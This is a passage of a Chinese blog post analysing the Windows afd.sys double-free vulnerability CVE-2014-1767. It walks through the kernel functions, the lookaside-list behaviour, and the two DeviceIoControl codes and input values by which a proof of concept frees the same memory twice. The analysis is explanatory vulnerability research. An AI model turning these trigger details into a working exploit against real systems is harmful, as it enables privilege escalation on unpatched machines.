<p><span style="font-family: 微软雅黑;">其中的</span><span style="font-family: Times New Roman;">Type3InputBuffer</span><span style="font-family: 微软雅黑;">成员是用来存储</span><span style="font-family: Times New Roman;">DeviceIoControl</span><span style="font-family: 微软雅黑;">中</span><span style="font-family: Times New Roman;">InputBuffer</span><span style="font-family: 微软雅黑;">的内容，位于</span><span style="font-family: Times New Roman;">IO_Stack_Location+0x10</span><span style="font-family: 微软雅黑;">的位置。</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120106019-1901645584.png" alt=""></p>
<p><span style="font-family: Times New Roman;"><strong>AfdTransmitFile</strong></span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120106769-1978294529.png" alt=""></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">1. </span><span style="font-family: 微软雅黑;">检查用户层</span><span style="font-family: Times New Roman;">DeviceIoControl</span><span style="font-family: 微软雅黑;">中</span><span style="font-family: Times New Roman;">InputBufferSize</span><span style="font-family: 微软雅黑;">是否大于</span><span style="font-family: Times New Roman;">30h</span><span style="font-family: 微软雅黑;">。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">2. </span><span style="font-family: 微软雅黑;">对</span><span style="font-family: Times New Roman;">IoStackLocation-&gt;Type3InputBuffer</span><span style="font-family: 微软雅黑;">做一些有效性检查。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">3. </span><span style="font-family: 微软雅黑;">调用</span><span style="font-family: Times New Roman;">AfdTliGetTpInfo</span><span style="font-family: 微软雅黑;">分配一个</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">结构。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">4. </span><span style="font-family: 微软雅黑;">根据</span><span style="font-family: Times New Roman;">VirtualAddress</span><span style="font-family: 微软雅黑;">和</span><span style="font-family: Times New Roman;">Length</span><span style="font-family: 微软雅黑;">创建一个</span><span style="font-family: Times New Roman;">Mdl(</span><span style="font-family: 微软雅黑;">此时</span><span style="font-family: Times New Roman;">VirtualAddress</span><span style="font-family: 微软雅黑;">和</span><span style="font-family: Times New Roman;">Length</span><span style="font-family: 微软雅黑;">的值是从</span><span style="font-family: Times New Roman;">Type3InputBuffer</span><span style="font-family: 微软雅黑;">得到的，分别对应的是</span><span style="font-family: Times New Roman;">inbuf1[6]</span><span style="font-family: 微软雅黑;">和</span><span style="font-family: Times New Roman;">inbuf1[7])</span><span style="font-family: 微软雅黑;">，并将其地址写入到</span><span style="font-family: Times New Roman;">TpElementArray</span><span style="font-family: 微软雅黑;">的合适位置。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">5. </span><span style="font-family: 微软雅黑;">调用函数</span><span style="font-family: Times New Roman;">MmProbeAndLockPages</span><span style="font-family: 微软雅黑;">准备操作这块</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">，但是此时因为要映射的地址无效</span><span style="font-family: Times New Roman;">(VirtualAddress=0x13371337)</span><span style="font-family: 微软雅黑;">，触发异常，调用</span><span style="font-family: Times New Roman;">AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">释放</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">。</span></p>
<p>&nbsp;</p>
<p><span style="font-family: Times New Roman;"><strong>AfdTliGetTpInfo </strong></span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120107425-1893723380.png" alt=""></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">1. </span><span style="font-family: 微软雅黑;">设置异常处理模块</span><span style="font-family: Times New Roman;">,</span><span style="font-family: 微软雅黑;">发生异常会调用</span><span style="font-family: Times New Roman;">AfdReturnInfo</span><span style="font-family: 微软雅黑;">函数。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">2. </span><span style="font-family: 微软雅黑;">调用</span><span style="font-family: Times New Roman;">ExAllocateFromNPagedLookasideList</span><span style="font-family: 微软雅黑;">函数从</span><span style="font-family: Times New Roman;">Lookaside List</span><span style="font-family: 微软雅黑;">为</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">分配一块</span><span style="font-family: Times New Roman;">pool</span><span style="font-family: 微软雅黑;">。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">3. </span><span style="font-family: 微软雅黑;">判断</span><span style="font-family: Times New Roman;">tpElementCount</span><span style="font-family: 微软雅黑;">是否大于</span><span style="font-family: Times New Roman;">3</span><span style="font-family: 微软雅黑;">，大于则会为</span><span style="font-family: Times New Roman;">TpElementArray</span><span style="font-family: 微软雅黑;">更多的空间，否则就直接用</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">的空间了。</span></p>
<p><span style="font-family: 微软雅黑;">这里的</span><span style="font-family: Times New Roman;">nCount</span><span style="font-family: 微软雅黑;">是通过用户层</span><span style="font-family: Times New Roman;">DeviceIoControl</span><span style="font-family: 微软雅黑;">的</span><span style="font-family: Times New Roman;">InputBuffer</span><span style="font-family: 微软雅黑;">获得，位于</span><span style="font-family: Times New Roman;">InputBuffer[2]</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: 微软雅黑;">来解释一下此时的</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">，可以看到其是一个定值为</span><span style="font-family: Times New Roman;">0x874ff428</span><span style="font-family: 微软雅黑;">，这表明其是一个</span><span style="font-family: Times New Roman;">Dedicated Lookaside Lists</span><span style="font-family: 微软雅黑;">，相当于专用的</span><span style="font-family: Times New Roman;">Lookaside </span><span style="font-family: 微软雅黑;">。用</span><span style="font-family: Times New Roman;">windbg</span><span style="font-family: 微软雅黑;">查看这个</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120108128-1338026729.png" alt=""></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120108738-2074080055.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">可以看到，刚开始的时候这个</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">为空。</span></p>
<p><strong><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">的分配和释放算法是理解为何会得到同一个</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">的关键所在，来看一下：</span></strong></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120109222-836873254.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">首先是分配算法，流程如下：</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">1. </span><span style="font-family: 微软雅黑;">记录分配的次数。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">2. </span><span style="font-family: 微软雅黑;">尝试从</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">卸载下一个</span><span style="font-family: Times New Roman;">ListEntry</span><span style="font-family: 微软雅黑;">。第一次的</span><span style="font-family: Times New Roman;">IOControl</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">为空，所以会进入到下一步的流程。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">3. </span><span style="font-family: 微软雅黑;">尝试失败，调用</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">的分配函数重新分配一块</span><span style="font-family: Times New Roman;">pool</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: 微软雅黑;">接着是释放算法：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120109894-475395427.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">流程：</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">1. </span><span style="font-family: 微软雅黑;">记录释放的次数。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">2. </span><span style="font-family: 微软雅黑;">如果此时</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">的</span><span style="font-family: Times New Roman;">Depth</span><span style="font-family: 微软雅黑;">小于</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">的</span><span style="font-family: Times New Roman;">MaxDepth</span><span style="font-family: 微软雅黑;">，则会将参数中的</span><span style="font-family: Times New Roman;">ListEntry</span><span style="font-family: 微软雅黑;">加入到</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">中，否则进入下一步。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">3. </span><span style="font-family: 微软雅黑;">记录释放失败的次数，调用</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">对应的释放函数。</span></p>
<p><span style="font-family: 微软雅黑;">在来看看</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">的分配和释放函数：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120110363-835793604.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">分配函数没有什么好说的，下面是释放函数：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120110863-489063356.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">流程：</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">1. </span><span style="font-family: 微软雅黑;">遍历</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">的</span><span style="font-family: Times New Roman;">TpElementArray</span><span style="font-family: 微软雅黑;">数组，释放</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">2. flags(</span><span style="font-family: 微软雅黑;">第二个参数</span><span style="font-family: Times New Roman;">)</span><span style="font-family: 微软雅黑;">为</span><span style="font-family: Times New Roman;">0</span><span style="font-family: 微软雅黑;">，调用</span><span style="font-family: Times New Roman;">AfdFreeTpInfo</span><span style="font-family: 微软雅黑;">释放</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">，否则调用</span><span style="font-family: Times New Roman;">ExFreeToNPagedLookasideList</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: 微软雅黑;">好了，现在还剩最后一个函数，</span><span style="font-family: Times New Roman;">IOControl=0x000120c3</span><span style="font-family: 微软雅黑;">对应的</span><span style="font-family: Times New Roman;">AfdTransmitPackets</span><span style="font-family: 微软雅黑;">函数：</span></p>
<p><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/928323-20160501120111488-32302803.png" alt=""></p>
<p><span style="font-family: 微软雅黑;">流程：</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">1. </span><span style="font-family: 微软雅黑;">对</span><span style="font-family: Times New Roman;">IRP</span><span style="font-family: 微软雅黑;">和</span><span style="font-family: Times New Roman;">IoStackLocation</span><span style="font-family: 微软雅黑;">做有效性检查。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">2. (IoStackLocation-&gt;InputBufferLength)&gt;0x10</span><span style="font-family: 微软雅黑;">。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">3. InputBuffer[0]!=0</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">InputBuffer[1]&lt;=0x0AAAAAAA</span><span style="font-family: 微软雅黑;">。这点解释了</span><span style="font-family: Times New Roman;">POC</span><span style="font-family: 微软雅黑;">中</span><span style="font-family: Times New Roman;">inbuf2</span><span style="font-family: 微软雅黑;">的值。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">4. </span><span style="font-family: 微软雅黑;">调用</span><span style="font-family: Times New Roman;">AfdTliGetTpInfo()</span><span style="font-family: 微软雅黑;">。</span></p>
<p>&nbsp;</p>
<p><span style="font-size: 14pt;"><strong><span style="font-family: Times New Roman;">2.6&nbsp;</span><span style="font-family: 微软雅黑;">流程分析</span></strong></span></p>
<p><span style="font-family: 微软雅黑;">现在是时候做一个总结了，整个漏洞的流程如下。</span></p>
<p><span style="font-family: Times New Roman;">POC</span><span style="font-family: 微软雅黑;">创建了一个以</span><span style="font-family: Times New Roman;">socket</span><span style="font-family: 微软雅黑;">为基础的本地网络连接，调用</span><span style="font-family: Times New Roman;">DeviceIoControl</span><span style="font-family: 微软雅黑;">向</span><span style="font-family: Times New Roman;">socket</span><span style="font-family: 微软雅黑;">对象分别发送两个控制码</span><span style="font-family: Times New Roman;">0x1207F</span><span style="font-family: 微软雅黑;">和</span><span style="font-family: Times New Roman;">0x120C3</span><span style="font-family: 微软雅黑;">，这两次控制码分别对应</span><span style="font-family: Times New Roman;">afd.sys</span><span style="font-family: 微软雅黑;">的</span><span style="font-family: Times New Roman;">AfdTransmitFile</span><span style="font-family: 微软雅黑;">和</span><span style="font-family: Times New Roman;">AfdTransmitPackets</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: Times New Roman;"><strong>IOControl=0x1207F </strong></span></p>
<p><span style="font-family: Times New Roman;">1. AfdTransmitFile</span><span style="font-family: 微软雅黑;">会调用</span><span style="font-family: Times New Roman;">AfdTliGetTpInfo</span><span style="font-family: 微软雅黑;">来获得一个</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">结构，</span><span style="font-family: Times New Roman;">AfdTliGetTpInfo</span><span style="font-family: 微软雅黑;">会尝试从</span><span style="font-family: Times New Roman;">Dedicated Lookaside Lists</span><span style="font-family: 微软雅黑;">获得一个</span><span style="font-family: Times New Roman;">ListEntry</span><span style="font-family: 微软雅黑;">，但是由于此时这个</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">为空，所以调用</span><span style="font-family: Times New Roman;">AfdAllocateTpInfo</span><span style="font-family: 微软雅黑;">函数重新分配了一块</span><span style="font-family: Times New Roman;">pool</span><span style="font-family: 微软雅黑;">给</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">使用。</span></p>
<p><span style="font-family: Times New Roman;">2. </span><span style="font-family: 微软雅黑;">接着</span><span style="font-family: Times New Roman;">AfdTransmitFile</span><span style="font-family: 微软雅黑;">根据用户层传递过来的</span><span style="font-family: Times New Roman;">VirtualAddress=0x13371337</span><span style="font-family: 微软雅黑;">和</span><span style="font-family: Times New Roman;">Length</span><span style="font-family: 微软雅黑;">来创建一个</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">，用来和用户层交互，并将这个</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">的地址保存到</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">结构中的</span><span style="font-family: Times New Roman;">TpElementArray</span><span style="font-family: 微软雅黑;">数组中。</span></p>
<p><span style="font-family: Times New Roman;">3. AfdTransmitFile</span><span style="font-family: 微软雅黑;">接着调用</span><span style="font-family: Times New Roman;">MmProbeAndLockPages</span><span style="font-family: 微软雅黑;">函数，准备对申请的</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">进行操作，但是由于无效的地址</span><span style="font-family: Times New Roman;">(VirtualAddress=0x13371337)</span><span style="font-family: 微软雅黑;">，程序进入到异常处理的流程中。</span></p>
<p><span style="font-family: Times New Roman;">4. </span><span style="font-family: 微软雅黑;">异常处理流程会调用</span><span style="font-family: Times New Roman;">AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">函数，</span><span style="font-family: Times New Roman;">AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">函数遍历</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">结构的</span><span style="font-family: Times New Roman;">TpElementArray</span><span style="font-family: 微软雅黑;">数组，将</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">释放掉。接着其会调用</span><span style="font-family: Times New Roman;">ExFreeToNPagedLookasideList</span><span style="font-family: 微软雅黑;">释放刚创建的</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: Times New Roman;">5. </span><span style="font-family: 微软雅黑;">但是因为此时这个</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">很</span><span style="font-family: Times New Roman;">"</span><span style="font-family: 微软雅黑;">闲</span><span style="font-family: Times New Roman;">"</span><span style="font-family: 微软雅黑;">，</span><span style="font-family: Times New Roman;">ExFreeToNPagedLookasideList</span><span style="color: black;"><span style="font-family: 微软雅黑;">不会将</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">释放掉，而是将其挂载到</span><span style="font-family: Times New Roman;">Dedicated Lookaside List</span><span style="font-family: 微软雅黑;">中去。但此时</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">所在</span><span style="font-family: Times New Roman;">pool</span><span style="font-family: 微软雅黑;">数据还保留着，并没有清空，当然也包括已经释放掉的</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">地址，<span style="color: red;">成了一个</span></span><span style="font-family: Times New Roman;">dangling pointer</span><span style="font-family: 微软雅黑;">，这里就埋下了隐患。<span style="color: red;">这是第一次</span></span><span style="font-family: Times New Roman;">free</span><span style="color: red;"><span style="font-family: 微软雅黑;">的地方。</span></span></span></p>
<p><span style="color: black;"><span style="font-family: 微软雅黑;">第一次</span><span style="font-family: Times New Roman;">IoControl</span><span style="font-family: 微软雅黑;">的操作主要就是放置一个</span><span style="font-family: Times New Roman;">dangling pointer</span><span style="font-family: 微软雅黑;">到</span><span style="font-family: Times New Roman;">Dedicated Lookaside Lists</span><span style="font-family: 微软雅黑;">中。</span></span></p>
<p><span style="color: black;"><span style="font-family: 微软雅黑;">第二次</span><span style="font-family: Times New Roman;">IoControl</span><span style="font-family: 微软雅黑;">对这个</span><span style="font-family: Times New Roman;">dangling pointer</span><span style="font-family: 微软雅黑;">进行二次释放。</span></span></p>
<p>&nbsp;</p>
<p><span style="font-family: Times New Roman;"><strong>IOControl=0x120C3 </strong></span></p>
<p><span style="font-family: Times New Roman;">1. </span><span style="font-family: 微软雅黑;">接下来</span><span style="font-family: Times New Roman;">AfdTransmitPackets</span><span style="font-family: 微软雅黑;">同样会调用</span><span style="font-family: Times New Roman;">AfdTliGetTpInfo</span><span style="font-family: 微软雅黑;">创建一个</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">结构。</span><span style="font-family: Times New Roman;">AfdTliGetTpInfo</span><span style="font-family: 微软雅黑;">会调用</span><span style="font-family: Times New Roman;">ExAllocateFromNPagedLookasideList</span><span style="font-family: 微软雅黑;">，尝试从</span><span style="font-family: Times New Roman;">Dedicated Lookaside Lists</span><span style="font-family: 微软雅黑;">获得</span><span style="font-family: Times New Roman;">ListEntry</span><span style="font-family: 微软雅黑;">。因为此时的</span><span style="font-family: Times New Roman;">Dedicated Lookaside Lists</span><span style="font-family: 微软雅黑;">不为空，所以会从中卸载一个</span><span style="font-family: Times New Roman;">ListEntry</span><span style="font-family: 微软雅黑;">给</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">使用，而此时</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">就只有一个上一次</span><span style="font-family: Times New Roman;">AfdTransmitFile</span><span style="font-family: 微软雅黑;">函数放入的</span><span style="font-family: Times New Roman;">ListEntry</span><span style="font-family: 微软雅黑;">，所以这个</span><span style="font-family: Times New Roman;">ListEntry</span><span style="font-family: 微软雅黑;">正好是响应上一个控制码所放进去的那个！</span></p>
<p><span style="font-family: Times New Roman;">2. </span><span style="font-family: 微软雅黑;">接着</span><span style="font-family: Times New Roman;">AfdTliGetTpInfo</span><span style="font-family: 微软雅黑;">会从用户层输入</span><span style="font-family: Times New Roman;">inbuf2[1]</span><span style="font-family: 微软雅黑;">获得值</span><span style="font-family: Times New Roman;">0x0AAAAAAA</span><span style="font-family: 微软雅黑;">，作为</span><span style="font-family: Times New Roman;">TpElementCount</span><span style="font-family: 微软雅黑;">，接下来会创建一个</span><span style="font-family: Times New Roman;">0x0AAAAAAA*0x18=0xFFFFFFF0</span><span style="font-family: 微软雅黑;">大小的</span><span style="font-family: Times New Roman;">pool,</span><span style="font-family: 微软雅黑;">这显然太大了，所以会再一次的进去到异常处理的操作。</span></p>
<p><span style="font-family: Times New Roman;">3. </span><span style="font-family: 微软雅黑;">异常处理会调用</span><span style="font-family: Times New Roman;">AfdReturnTpInfo</span><span style="font-family: 微软雅黑;">，其会遍历</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">尝试释放掉</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">。因为此时的</span><span style="font-family: Times New Roman;">TpInfo</span><span style="font-family: 微软雅黑;">所在的</span><span style="font-family: Times New Roman;">pool</span><span style="font-family: 微软雅黑;">正是</span><span style="font-family: Times New Roman;">"<span style="color: black;"> dangling pointer</span>"</span><span style="font-family: 微软雅黑;">，而</span><span style="font-family: Times New Roman;">Mdl</span><span style="font-family: 微软雅黑;">已经被释放过一次了，<span style="color: red;">这时发生</span></span><span style="font-family: Times New Roman;">double-free</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-family: Times New Roman;">4. </span><span style="font-family: 微软雅黑;">然后发生</span><span style="font-family: Times New Roman;">BSOD</span><span style="font-family: 微软雅黑;">。</span></p>
<p><span style="font-size: 14pt;"><strong><span style="font-family: Times New Roman;">2.7.</span><span style="font-family: 微软雅黑;">总结</span></strong></span></p>
<p><span style="font-family: 微软雅黑;">此漏洞被</span><span style="font-family: Times New Roman;">2014</span><span style="font-family: 微软雅黑;">年黑客奥斯卡评为最佳提权漏洞，因为其从</span><span style="font-family: Times New Roman;">Windows</span><span style="font-family: 微软雅黑;">上的内核级漏洞绕过</span><span style="font-family: Times New Roman;">Windows 8.1</span><span style="font-family: 微软雅黑;">上的</span><span style="font-family: Times New Roman;">IE11</span><span style="font-family: 微软雅黑;">沙箱。关于漏洞成因流程有两个比较有意思的地方：</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">1. </span><span style="font-family: 微软雅黑;">两次使内核函数进入到异常处理流程。</span></p>
<p style="text-align: justify;"><span style="font-family: Times New Roman;">2. </span><span style="font-family: 微软雅黑;">两次从</span><span style="font-family: Times New Roman;">Lookaside</span><span style="font-family: 微软雅黑;">得到的</span><span style="font-family: Times New Roman;">pool</span><span style="font-family: 微软雅黑;">地址相同。</span></p>
<p style="text-align: justify;"><span style="font-size: 18pt;"><strong><span style="font-family: 微软雅黑;">3. 参考</span></strong></span></p>
<p><a href="http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/"><span style="font-family: Times New Roman; font-size: 10pt;">http://www.secniu.com/cve-2014-1767-afd-sys-double-free-vulnerability-analysis-and-exploit/</span></a></p>
<p><span style="font-family: Times New Roman; font-size: 10pt;">http://www.siberas.de/papers/Pwn2Own_2014_AFD.sys_privilege_escalation.pdf</span></p>
<p>by：会飞的猫<br>转载请注明:http://www.cnblogs.com/flycat-2016</p>
<p>&nbsp;</p></div><div id="MySignature"></div>
<div class="clear"></div>
<div id="blog_post_info_block">
<div id="BlogPostCategory"></div>
<div id="EntryTag"></div>
<div id="blog_post_info"><div id="green_channel">
        <a href="javascript:void(0);" id="green_channel_digg" onclick="DiggIt(5450275,cb_blogId,1);green_channel_success(this,&#39;谢谢推荐！&#39;);">好文要顶</a>
            <a id="green_channel_follow" onclick="follow(&#39;20abe80a-62fa-e511-9fc1-ac853d9f53cc&#39;);" href="javascript:void(0);">关注我</a>
    <a id="green_channel_favorite" onclick="AddToWz(cb_entryId);return false;" href="javascript:void(0);">收藏该文</a>
    <a id="green_channel_weibo" href="javascript:void(0);" title="分享至新浪微博" onclick="ShareToTsina()"><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/icon_weibo_24.png" alt=""></a>
    <a id="green_channel_wechat" href="javascript:void(0);" title="分享至微信" onclick="shareOnWechat()"><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/wechat.png" alt=""></a>
</div>
<div id="author_profile">
    <div id="author_profile_info" class="author_profile_info">
            <a href="http://home.cnblogs.com/u/flycat-2016/" target="_blank"><img src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/sample_face.gif" class="author_avatar" alt=""></a>
        <div id="author_profile_detail" class="author_profile_info">
            <a href="http://home.cnblogs.com/u/flycat-2016/">會飛的貓</a><br>
            <a href="http://home.cnblogs.com/u/flycat-2016/followees">关注 - 0</a><br>
            <a href="http://home.cnblogs.com/u/flycat-2016/followers">粉丝 - 3</a>
        </div>
    </div>
    <div class="clear"></div>
    <div id="author_profile_honor"></div>
    <div id="author_profile_follow">
                <a href="javascript:void(0);" onclick="follow(&#39;20abe80a-62fa-e511-9fc1-ac853d9f53cc&#39;);return false;">+加关注</a>
    </div>
</div>
<div id="div_digg">
    <div class="diggit" onclick="votePost(5450275,&#39;Digg&#39;)">
        <span class="diggnum" id="digg_count">0</span>
    </div>
    <div class="buryit" onclick="votePost(5450275,&#39;Bury&#39;)">
        <span class="burynum" id="bury_count">0</span>
    </div>
    <div class="clear"></div>
    <div class="diggword" id="digg_tips">
    </div>
</div>
<script type="text/javascript">
    currentDiggType = 0;
</script></div>
<div class="clear"></div>
<div id="post_next_prev"><a href="http://www.cnblogs.com/flycat-2016/p/5450247.html" class="p_n_p_prefix">« </a> 上一篇：<a href="http://www.cnblogs.com/flycat-2016/p/5450247.html" title="发布于2016-05-02 22:37">CVE-2014-4113 Win8.1 64位利用(2014.11)</a><br><a href="http://www.cnblogs.com/flycat-2016/p/5449769.html" class="p_n_p_prefix">» </a> 下一篇：<a href="http://www.cnblogs.com/flycat-2016/p/5449769.html" title="发布于2016-05-02 22:39">CVE-2016-0143 漏洞分析(2016.4)</a><br></div>
</div>


		</div>
		<div class="postDesc">posted @ <span id="post-date">2016-05-02 22:38</span> <a href="http://www.cnblogs.com/flycat-2016/">會飛的貓</a> 阅读(<span id="post_view_count">240</span>) 评论(<span id="post_comment_count">0</span>)  <a href="https://i.cnblogs.com/EditPosts.aspx?postid=5450275" rel="nofollow">编辑</a> <a href="http://www.cnblogs.com/flycat-2016/p/5450275.html#" onclick="AddToWz(5450275);return false;">收藏</a></div>
	</div>
	<script type="text/javascript">var allowComments=true,cb_blogId=277617,cb_entryId=5450275,cb_blogApp=currentBlogApp,cb_blogUserGuid='20abe80a-62fa-e511-9fc1-ac853d9f53cc',cb_entryCreatedDate='2016/5/2 22:38:00';loadViewCount(cb_entryId);var cb_postType=1;</script>
	
</div><!--end: topics 文章、评论容器-->
</div><a name="!comments"></a><div id="blog-comments-placeholder"></div><script type="text/javascript">var commentManager = new blogCommentManager();commentManager.renderComments(0);</script>
<div id="comment_form" class="commentform">
<a name="commentform"></a>
<div id="divCommentShow"></div>
<div id="comment_nav"><span id="span_refresh_tips"></span><a href="javascript:void(0);" onclick="return RefreshCommentList();" id="lnk_RefreshComments" runat="server" clientidmode="Static">刷新评论</a><a href="http://www.cnblogs.com/flycat-2016/p/5450275.html#" onclick="return RefreshPage();">刷新页面</a><a href="http://www.cnblogs.com/flycat-2016/p/5450275.html#top">返回顶部</a></div>
<div id="comment_form_container"><script type="text/javascript" src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/mention.js.下载"></script>
<div id="commentform_title">发表评论</div>
<span id="tip_comment" style="color:Red"></span>
<p>
昵称：<input type="text" id="tbCommentAuthor" class="author" disabled="disabled" size="50" value="五千年木">
</p>
<div class="commentbox_main">
<div class="commentbox_title">
<div class="commentbox_title_left">评论内容：</div>
<div class="commentbox_title_right">
<img id="ubb_quote" class="comment_icon" src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/quote.gif" alt="引用" title="添加引用" onclick="insertUBB(&#39;tbCommentBody&#39;,&#39;quote&#39;)">
<img id="ubb_bold" class="comment_icon" src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/b.png" alt="粗体" title="添加粗体" onclick="insertUBB(&#39;tbCommentBody&#39;,&#39;b&#39;)">
<img id="ubb_url" class="comment_icon" src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/lk.png" alt="链接" title="添加链接" onclick="insertUbbUrl(&#39;tbCommentBody&#39;)">
<img id="ubb_indent" class="comment_icon" src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/indent.png" alt="缩进" title="添加首行缩进" onclick="insertIndent(&#39;tbCommentBody&#39;)">
<img id="ubb_code" class="comment_icon" src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/InsertCode.gif" alt="代码" title="添加代码" onclick="insertUbbCode()">
<img id="ubb_img" class="comment_icon" src="./CVE-2014-1767 漏洞分析(2015.1) - 會飛的貓 - 博客园_files/img.gif" alt="图片" title="上传图片" onclick="OpenImageUploadWindow();">
</div>
</div>
<div class="clear"></div>
<textarea id="tbCommentBody" class="comment_textarea"></textarea>
</div>
<p id="commentbox_opt">
<input id="btn_comment_submit" type="button" class="comment_btn" value="提交评论">
